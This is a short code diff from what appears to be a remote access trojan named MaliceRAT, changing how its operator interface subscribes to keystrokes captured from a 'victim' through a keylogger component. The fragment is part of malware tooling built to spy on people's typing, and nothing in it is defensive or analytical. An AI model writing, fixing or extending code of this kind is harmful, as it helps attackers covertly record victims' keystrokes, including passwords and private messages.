@@ -14,7 +14,7 @@ namespace MaliceRAT.RatUI
             this.victimId = victimId;
             this.server = server;
 
-            server.KeystrokeReceived += OnKeystrokeReceived;
+            server.keyLogger.OnKeystrokeReceived += OnKeystrokeReceived;
         }
 
         private void OnKeystrokeReceived(Victim victim, string keystroke)
